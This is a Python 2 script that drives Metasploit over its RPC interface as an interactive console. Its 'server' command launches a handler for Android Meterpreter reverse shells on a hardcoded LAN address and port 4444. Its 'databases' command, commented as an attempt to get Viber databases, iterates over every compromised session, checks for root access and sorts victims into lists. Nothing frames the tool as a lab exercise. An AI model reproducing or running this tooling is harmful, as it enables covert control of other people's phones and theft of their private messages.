#!/usr/bin/env python

try:
    import time
    import sys
    import threading
    from optparse import OptionParser
    from ReadInputThread import ReadInputThread
except ImportError as msg:
    print "[-] Library not installed: " + str(msg)
    print "[*] Try installing it with: pip install " + str(msg.message)
    sys.exit()

try:
    try:
      import readline
    except ImportError:
      import pyreadline as readline
except ImportError:
    print "[-] Readline module is not installed!"
    print "[*] Install on Linux with: pip install readline"
    print "[*] Install on Windows with: pip install pyreadline"
    sys.exit()

try:
    from MsfConsole import MsfConsole
    from metasploit.msfrpc import MsfRpcError
except ImportError as msg:
    print "[-] Missing library pymetasploit"
    print "[*] Please clone from \"git clone https://github.com/allfro/pymetasploit.git pymetasploit\""
    print "[*] \"cd pymetasploit && sudo python setup.py install\""
    sys.exit()

#
class Main:
    # Hardcoded credentials
    username = "msf"
    password = "msf"
    port = 55553
    #host = "127.0.0.1"
    host = "192.168.1.128"
    ssl = True

    # Variables
    msfconsole = None

    def __init__(self):
        ###
        # Command line argument parser
        ###
        parser = OptionParser()
        parser.add_option("-r", "--resource", action="store", type="string", dest="resource", help="Path to resource file")
        parser.add_option("-u", "--user", action="store", type="string", dest="username", help="Username specified on msfrpcd")
        parser.add_option("-p", "--pass", action="store", type="string", dest="password", help="Password specified on msfrpcd")
        parser.add_option("-s", "--ssl", action="store_true", dest="ssl", help="Enable ssl")
        parser.add_option("-P", "--port", action="store", type="string", dest="port", help="Port to connect to")
        parser.add_option("-H", "--host", action="store", type="string", dest="host", help="Server ip")
        parser.add_option("-c", "--credentials", action="store_true", dest="credentials", help="Use hardcoded credentials")
        parser.add_option("-e", "--exit", action="store_true", dest="exit", help="Exit after executing resource script")
        (options, args) = parser.parse_args()

        if len(sys.argv) is not 1 and options.credentials is None:
            if options.username is not None:
                self.username = options.username
            else:
                print "[*] Use default: username => msf"
                self.username = "msf"

            if options.password is not None:
                self.password = options.password
            else:
                print "[*] Use default: password => msf"
                self.password = "msf"

            if options.ssl is True:
                self.ssl = True
            else:
                print "[*] Use default: ssl => False"
                self.ssl = False

            if options.port is not None:
                self.port = options.port
            else:
                print "[*] Use default: port => 55553"
                self.port = 55553

            if options.host is not None:
                self.host = options.host
            else:
                print "[*] Use default: host => 127.0.0.1"
                #self.host = "127.0.0.1"
                self.host = "192.168.1.128"
        else:
            if self.host and self.port and self.password and self.ssl and self.username is None:
                print "[-] You have to specify all hardcoded credentials"
                sys.exit()
            print "[*] Using hardcoded credentials!"

        # Objects
        self.msfconsole = MsfConsole(self.username, self.password, self.port, self.host, self.ssl)

        # Connect to msfrpcd
        if self.msfconsole.connect() is False:
            sys.exit()

        # If -r flag is given
        if options.resource is not None:
            self.msfconsole.load_resource(options.resource)
            time.sleep(3)

            if options.exit is True:
                self.msfconsole.disconnect()
                sys.exit()

        # Add directory auto completion
        readline.parse_and_bind("tab: complete")

        # Go to main menu
        self.exec_menu('main_menu')

    # Executes menu function
    def exec_menu(self, choice):
        # If empty input immediately go back to main menu
        if choice == '':
            self.menu_actions['main_menu'](self)
        else:
            # Execute selected function out of dictionary
            try:
                self.menu_actions[choice](self)
            # If given input isn't in dictionary
            except KeyError:
                print '[-] Invalid selection, please try again.'
                time.sleep(1)
                self.menu_actions['main_menu'](self)
    
    # wait for a response
    def wait_response(self, command):
        self.msfconsole.clr_response()
        self.msfconsole.exec_command(command)
        start_time = time.time()
	while True:
            if self.msfconsole.get_response():
                break
	    elapsed = time.time() - start_time
	    if elapsed > 10:
	    	return "timeout"
        return self.msfconsole.get_response()
	
    # get sessions
    def get_sessions(self):
        outfile = open('list.txt','w')
        outfile.writelines(self.wait_response("sessions"))
        outfile.close()
              	        
    def get_root(self):
        str = self.wait_response("check_root")
	if str == "timeout":
	    return False
        if len(str.split()) == 5:
            return False
        return True
			
    
    # Main Menu
    def main_menu(self):
        try:
            # Create read thread
            readThread = ReadInputThread(self.msfconsole.get_path())
            readThread.start()

            try:
                while True:
                    # Get command user types in
                    command = readThread.get_command()

                    # If command is not empty break out of loop
                    if command:
                        break

                    # Run in background and read possible output from msfrpcd
                    if self.msfconsole.read_output():
                        # Found data to read
                        readThread.set_path(self.msfconsole.get_path())
            except ValueError:
                pass

            if command == "quit":
                self.msfconsole.disconnect()
                sys.exit()

            # return last session
            if command == "n":
                print self.msfconsole.get_response()
                self.exec_menu('main_menu')

            # start msf server and enter again
            if command == "server":
                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444"
                self.msfconsole.exec_command(command)
                print self.msfconsole.get_response()
                self.msfconsole.exec_command("exploit")
                while True:
                    if self.msfconsole.get_response().startswith("[*] Started reverse TCP handler on"):
                        break
                    print self.msfconsole.get_response()
                    time.sleep(1)
                self.msfconsole.disconnect()
                if self.msfconsole.connect() is False:sys.exit()
            		# Add directory auto completion

                readline.parse_and_bind("tab: complete")
					# Go to main menu
		command = ""
            
            # get all survive sessions
            if command == "sessions":
                self.get_sessions()
                command = ""
                
            # try to get viber databases
            if command == "databases":
                self.get_sessions()
                infile = open('list.txt','r')
                outfile1 = open('root_list.txt','w')
                outfile2 = open('unroot_list.txt','w')
                for i in range(6):infile.readline()

                while True:
                    str = ""
                    str = infile.readline()
                    if len(str.split()) < 1:break
                    tmpstr = self.wait_response("sessions " + str.split()[0])
                    if tmpstr.split()[0] == "[-]":continue
                    if self.get_root():outfile1.writelines(str)
                    else:outfile2.writelines(str)
                    self.wait_response("background")
                command = ""
		infile.close()
		outfile1.close()
		outfile2.close()

            # If command not empty send it to msfrpcd
            if command:
                self.msfconsole.exec_command(command)

            # Go to this menu again
            self.exec_menu('main_menu')

        # Connection is only valid for 5 minutes afterwards request another one
        except MsfRpcError:
            print "[*] API token expired requesting new one..."
            if self.msfconsole.connect() is False:
                sys.exit()
            self.exec_menu('main_menu')
        except KeyboardInterrupt:
            self.msfconsole.disconnect()
            sys.exit()

    # Dictionary of menu entries
    menu_actions = {
        'main_menu': main_menu
    }

# Execute main
try:
    Main()
except KeyboardInterrupt:
    print "[*] Interrpted execution"
    exit(0)

except AttributeError:
    print "[-] You have to be connected to the server "
    exit(1)
